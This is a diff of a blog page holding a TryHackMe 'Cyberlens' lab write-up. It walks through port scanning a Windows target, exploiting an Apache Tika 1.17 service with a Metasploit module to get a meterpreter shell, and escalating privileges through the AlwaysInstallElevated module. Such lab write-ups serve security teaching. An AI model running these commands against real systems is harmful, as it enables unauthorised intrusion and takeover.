@@ -1056,6 +1056,39 @@
 
       
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
 
     
   
@@ -1063,49 +1096,6 @@
   
   
 
-  
-    
-    
-
-    
-      
-        
-        
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-
-    
   
 
   
@@ -1271,7 +1261,7 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="812 words"
+  title="807 words"
 >
   <em>4 min</em> read</span>
 
@@ -1306,21 +1296,43 @@
 
   <div class="content">
     <h1 id="introduction">Introduction</h1>
-
 <p>Hello everyone, today we will be taking a look at <a href="https://tryhackme.com/r/room/cyberlensp6">Cyberlens</a>, an <span class="easy">Easy</span> rated room on <a href="https://tryhackme.com/">TryHackMe</a>. We will explore the exploitation of a vulnerable Windows server, before moving on to the privilege escalation phase using the Metasploit framework. Let’s get started !</p>
 
-<h1 id="walkthrough">Walkthrough</h1>
+<ol>
+  <li>Enumeration
+    <ul>
+      <li><a href="#portscan">Portscan</a></li>
+      <li><a href="#smb-139-445">SMB (139,445)</a></li>
+      <li><a href="#http-80">HTTP (80)</a></li>
+      <li><a href="#http-61777">HTTP (61777)</a></li>
+    </ul>
+  </li>
+  <li>Exploitation
+    <ul>
+      <li><a href="#metasploit">Exploiting with metasploit</a></li>
+    </ul>
+  </li>
+  <li>Privesc
+    <ul>
+      <li><a href="#metasploit-1">Privesc with metasploit</a></li>
+    </ul>
+  </li>
+</ol>
 
-<h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<hr />
 
-<p>As always, we begin with a basic rustscan port scan, followed by an nmap scan with identification of services version, and we output the result to a file named <code class="language-plaintext highlighter-rouge">all_ports</code>.</p>
+<p><br /></p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<h2 id="portscan"><span class="me-2">Portscan</span><a href="#portscan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>As always, I like to begin with a basic <a href="https://github.com/RustScan/RustScan">rustscan</a> port scan, followed by an nmap scan with identification of services version, and output the result to a file named <code class="language-plaintext highlighter-rouge">all_ports</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>rustscan <span class="nt">-a</span> <span class="nv">$TARGET_IP</span> <span class="nt">--</span> <span class="nt">-sV</span> <span class="nt">-oN</span> all_ports
 </pre></td></tr></tbody></table></code></div></div>
-
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
@@ -1353,14 +1365,15 @@ PORT        STATE SERVICE       REASON  VERSION
 Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows 
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>We learn a few essential things from this scan:</p>
+<p><strong>What do we learn from this portscan ?</strong></p>
 <ul>
-  <li>The target is running Windows Server</li>
+  <li>The target is a Windows Server</li>
   <li>There are 4 HTTP servers, as well as SMB and RDP running</li>
 </ul>
 
-<h3 id="smb-139-445"><span class="me-2">SMB (139, 445)</span><a href="#smb-139-445" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-<p>I like to start by enumerating SMB because it’s relatively quick, and we always find juicy files. So I ran:</p>
+<h2 id="smb-139-445"><span class="me-2">SMB (139, 445)</span><a href="#smb-139-445" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>I like to start by enumerating SMB because it’s relatively quick, and we always find juicy files. I’ll use <a href="https://www.kali.org/tools/samba/#smbclient">smbclient</a>:</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
@@ -1375,8 +1388,7 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 </pre></td></tr></tbody></table></code></div></div>
 <p>Unfortunately, nothing interesting came up.</p>
 
-<h3 id="http-80"><span class="me-2">HTTP (80)</span><a href="#http-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-
+<h2 id="http-80"><span class="me-2">HTTP (80)</span><a href="#http-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <p><a href="/assets/img/writeups/thm/cyberlens/interesting_page.png" class="popup img-link  shimmer"><img src="/assets/img/writeups/thm/cyberlens/interesting_page.png" alt="http" loading="lazy"></a></p>
 
 <p>The main functionality of this server is to provide image metadata extraction. However, pressing <code class="language-plaintext highlighter-rouge">Ctrl + U</code> revealed no form in the HTML source code:</p>
@@ -1401,7 +1413,7 @@ session setup failed: NT_STATUS_ACCESS_DENIED
     <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"metadataOutput"</span><span class="nt">&gt;&lt;/div&gt;</span>
 <span class="nt">&lt;/div&gt;</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p>That means that the metadata extraction functionality is probably handled by JavaScript. Scrolling further in the HTML source code, I found the following JavaScript code, <strong>where I removed irrelevant part</strong>:</p>
+<p>That means that the metadata extraction functionality is likely to be handled by <code class="language-plaintext highlighter-rouge">JavaScript</code>. Scrolling further in the HTML source code, I found the following JavaScript code, <strong>where I removed irrelevant part</strong>:</p>
 
 <div class="language-javascript highlighter-rouge"><div class="code-header">
         <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
@@ -1434,25 +1446,26 @@ session setup failed: NT_STATUS_ACCESS_DENIED
     <span class="p">})</span>
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p>As you can see, the JavaScript sends the file we uploaded on port 61777. This indicates that the service responsible for the metadata handling is indeed running on port 61777.</p>
+<p>As you can see, the JavaScript sends the file we uploaded on port <code class="language-plaintext highlighter-rouge">61777</code>. So the service responsible for the metadata handling is effectively running on port <code class="language-plaintext highlighter-rouge">61777</code>.</p>
 
-<h3 id="http-61777"><span class="me-2">HTTP (61777)</span><a href="#http-61777" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<h2 id="http-61777"><span class="me-2">HTTP (61777)</span><a href="#http-61777" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <p><a href="/assets/img/writeups/thm/cyberlens/tika.png" class="popup img-link  shimmer"><img src="/assets/img/writeups/thm/cyberlens/tika.png" alt="tika" loading="lazy"></a>
 <em>This seems to be a version disclosure</em></p>
 
-<p>Let’s take advantage of this significant version disclosure by running searchsploit on this Tika version:</p>
+<p>Let’s take advantage of this significant version disclosure by running <a href="https://www.kali.org/tools/exploitdb/">searchsploit</a> on this Tika version:</p>
 
 <p><a href="/assets/img/writeups/thm/cyberlens/searchsploit.png" class="popup img-link  shimmer"><img src="/assets/img/writeups/thm/cyberlens/searchsploit.png" alt="searchsploit" loading="lazy"></a>
 <em>Searchsploit found a Metasploit module that matches the Tika version</em></p>
 
-<h2 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h1 id="exploitation">Exploitation</h1>
 
-<p>Let’s start by launching <strong>Metasploit</strong> and searching for the Tika exploit we identified in the enumeration part.</p>
+<h2 id="metasploit"><span class="me-2">Metasploit</span><a href="#metasploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Let’s start by launching <a href="https://www.kali.org/tools/metasploit-framework/">Metasploit</a> and searching for the Tika exploit we identified in the enumeration part.</p>
 
 <p><a href="/assets/img/writeups/thm/cyberlens/metasploit.png" class="popup img-link  shimmer"><img src="/assets/img/writeups/thm/cyberlens/metasploit.png" alt="metasploit" loading="lazy"></a>
 <em>Metasploit exploit module for Tika 1.17</em></p>
 
-<p>After typing <code class="language-plaintext highlighter-rouge">show options</code>, we realize that a few options need to be configured:</p>
+<p>After typing <code class="language-plaintext highlighter-rouge">show options</code>, we notice that some parameters need to be configured.</p>
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
@@ -1477,14 +1490,15 @@ msf6 exploit<span class="o">(</span>windows/http/apache_tika_jp2_jscript<span cl
 <span class="o">[</span>+] The target is vulnerable.
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Within a few seconds, we’re greeted with a meterpreter session. Now, all that’s left is to grab the user flag!</p>
+<p>Within a few seconds, we’re greeted with a meterpreter session.</p>
 
 <p><a href="/assets/img/writeups/thm/cyberlens/user.txt.png" class="popup img-link  shimmer"><img src="/assets/img/writeups/thm/cyberlens/user.txt.png" alt="metasploit" loading="lazy"></a>
 <em>And we get our first flag !</em></p>
 
-<h2 id="privesc"><span class="me-2">Privesc</span><a href="#privesc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h1 id="privesc">Privesc</h1>
 
-<p>Since we are already in Metasploit, let’s use the integrated <code class="language-plaintext highlighter-rouge">post/multi/recon/local_exploit_suggester</code>. To do this, let’s start by backgrounding the meterpreter session by pressing <code class="language-plaintext highlighter-rouge">Ctrl + Z</code>, then let’s run the following commands:</p>
+<h2 id="metasploit-1"><span class="me-2">Metasploit</span><a href="#metasploit-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Since we are already in Metasploit, using the integrated <code class="language-plaintext highlighter-rouge">post/multi/recon/local_exploit_suggester</code> seems to be a great idea. Let’s start by backgrounding the meterpreter session by pressing <code class="language-plaintext highlighter-rouge">Ctrl + Z</code>, then let’s run the following commands:</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
@@ -1501,7 +1515,7 @@ msf6 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class=
 <p><a href="/assets/img/writeups/thm/cyberlens/privesc_enum.png" class="popup img-link  shimmer"><img src="/assets/img/writeups/thm/cyberlens/privesc_enum.png" alt="privesc_enum" loading="lazy"></a>
 <em>Metasploit’s local_exploit_suggester in action</em></p>
 
-<p>The scan reveals several vulnerabilities, but only one is explicitly marked as “vulnerable” <em>(and not simply as “appears to be vulnerable”)</em>. You can learn more about the “Always Install Elevated” feature on the <a href="https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">Microsoft official doc</a> and read <a href="https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path">this ressource</a> for an <em>Attacker perspective</em>.</p>
+<p>The scan reveals several vulnerabilities, but only one is explicitly marked as “vulnerable” <em>(and not as “appears to be vulnerable”)</em>. You can learn more about the “Always Install Elevated” feature on the <a href="https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">Microsoft official doc</a> and read <a href="https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path">this ressource</a> for an <em>Attacker perspective</em>.</p>
 
 <blockquote>
   <p>Users with limited privileges can exploit this feature by creating a Windows Installer installation package (MSI) that</p>
@@ -1509,23 +1523,19 @@ msf6 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class=
     <li>Creates a new local account in the local Administrators group</li>
     <li>Adds their current account to the local Administrators group</li>
     <li>Installs malicious software</li>
-    <li>Performs other unauthorized activities</li>
+    <li>Performs other unauthorized activities<sup id="fnref:footnote"><a href="#fn:footnote" class="footnote" rel="footnote" role="doc-noteref">1</a></sup></li>
   </ul>
 </blockquote>
-
-<p>– <cite><a href="https://www.tenable.com/audits/items/CIS_Microsoft_Windows_10_Enterprise_v3.0.0_L1.audit:0579e54650069622ac4fc5e965241d40">Source</a></cite></p>
 
 <p>Let’s give it a try !</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
 </pre></td><td class="rouge-code"><pre>msf6 <span class="o">&gt;</span> use exploit/windows/local/always_install_elevated 
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>After typing <code class="language-plaintext highlighter-rouge">show options</code>, we notice that some parameters need to be configured.</p>
+<p>Some parameters need to be configured.</p>
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
@@ -1538,8 +1548,17 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
 msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span class="o">)</span> <span class="o">&gt;</span> run
 </pre></td></tr></tbody></table></code></div></div>
 <p><a href="/assets/img/writeups/thm/cyberlens/root.txt.png" class="popup img-link  shimmer"><img src="/assets/img/writeups/thm/cyberlens/root.txt.png" alt="exploit_root" loading="lazy"></a>
-<em>And we rooted the room</em></p>
+<em>And we’ve rooted the room</em></p>
 
+<h1 id="reverse-footnote">Reverse footnote</h1>
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:footnote">
+      <p><a href="https://www.tenable.com/audits/items/CIS_Microsoft_Windows_10_Enterprise_v3.0.0_L1.audit:0579e54650069622ac4fc5e965241d40">source</a> (tenable) <a href="#fnref:footnote" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+  </ol>
+</div>
 
   </div>
 
@@ -1701,6 +1720,13 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
         
         
         <li class="text-truncate lh-lg">
+          <a href="/posts/thm-attacktivedirectory/">Attacktive Directory</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
           <a href="/posts/php-webchat/">PHP Chat</a>
         </li>
       
@@ -1709,13 +1735,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
         
         <li class="text-truncate lh-lg">
           <a href="/posts/laravel-ecommerce/">Laravel Cybershop</a>
-        </li>
-      
-        
-        
-        
-        <li class="text-truncate lh-lg">
-          <a href="/posts/ftpy/">FTPy</a>
         </li>
       
     </ul>
@@ -1744,10 +1763,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-        
-        
-
   
     
     
@@ -1782,37 +1797,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -1829,13 +1813,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -1876,10 +1853,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-        
-        
-
   
     
     
@@ -1902,21 +1875,10 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-        
-        
-
   
     
     
     
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -1928,17 +1890,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
   
     
     
@@ -1961,14 +1912,10 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-    
   
     
     
     
-    
-      
     
   
     
@@ -1994,7 +1941,25 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
     
   
     
@@ -2007,6 +1972,43 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
     
   
     
@@ -2019,6 +2021,62 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2041,6 +2099,15 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
+      
+    
+  
+    
+    
+    
+    
+      
+    
   
     
     
@@ -2059,6 +2126,15 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2072,12 +2148,12 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
+      
+    
   
     
     
     
-    
-      
     
   
     
@@ -2105,31 +2181,31 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
         <a class="post-tag btn btn-outline-primary" href="/tags/hacking-tools/">hacking-tools</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/metasploit/">metasploit</a>
-      
-        
         <a class="post-tag btn btn-outline-primary" href="/tags/tryhackme/">tryhackme</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/linux-privesc/">linux-privesc</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/pwncat/">pwncat</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/smb/">smb</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/windows-privesc/">windows-privesc</a>
+        <a class="post-tag btn btn-outline-primary" href="/tags/metasploit/">metasploit</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">wordpress</a>
+        <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active-directory</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/asreproast/">asreproast</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/golden-ticket/">golden-ticket</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/impacket/">impacket</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/kerberos/">kerberos</a>
       
     </div>
   </section>
@@ -2202,6 +2278,18 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
 
   
 
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
 
 
 
@@ -2215,6 +2303,34 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
   <aside id="related-posts" aria-labelledby="related-label">
     <h3 class="mb-4" id="related-label">Further Reading</h3>
     <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/posts/thm-attacktivedirectory/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1735488000"
+  data-df="ll"
+  
+>
+  Dec 29, 2024
+</time>
+
+              <h4 class="pt-0 my-2">Attacktive Directory</h4>
+              <div class="text-muted">
+                <p>99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?</p>
+              </div>
+            </div>
+          </a>
+        </article>
       
         <article class="col">
           <a href="/posts/thm-blog/" class="post-preview card h-100">
@@ -2316,10 +2432,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-        
-        
-
   
     
     
@@ -2354,37 +2466,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2401,13 +2482,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -2448,10 +2522,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-        
-        
-
   
     
     
@@ -2474,21 +2544,10 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-        
-        
-
   
     
     
     
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -2500,17 +2559,6 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
   
     
     
@@ -2533,14 +2581,10 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
-    
   
     
     
     
-    
-      
     
   
     
@@ -2566,7 +2610,25 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
-      
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
     
   
     
@@ -2579,6 +2641,43 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
     
   
     
@@ -2591,6 +2690,62 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2613,6 +2768,15 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
+      
+    
+  
+    
+    
+    
+    
+      
+    
   
     
     
@@ -2631,6 +2795,15 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2644,12 +2817,12 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
     
     
     
+      
+    
   
     
     
     
-    
-      
     
   
     
@@ -2677,31 +2850,31 @@ msf6 exploit<span class="o">(</span>windows/local/always_install_elevated<span c
         <a class="post-tag btn btn-outline-primary" href="/tags/hacking-tools/">hacking-tools</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/metasploit/">metasploit</a>
-      
-        
         <a class="post-tag btn btn-outline-primary" href="/tags/tryhackme/">tryhackme</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/linux-privesc/">linux-privesc</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/pwncat/">pwncat</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/smb/">smb</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/windows-privesc/">windows-privesc</a>
+        <a class="post-tag btn btn-outline-primary" href="/tags/metasploit/">metasploit</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">wordpress</a>
+        <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active-directory</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/asreproast/">asreproast</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/golden-ticket/">golden-ticket</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/impacket/">impacket</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/kerberos/">kerberos</a>
       
     </div>
   </section>
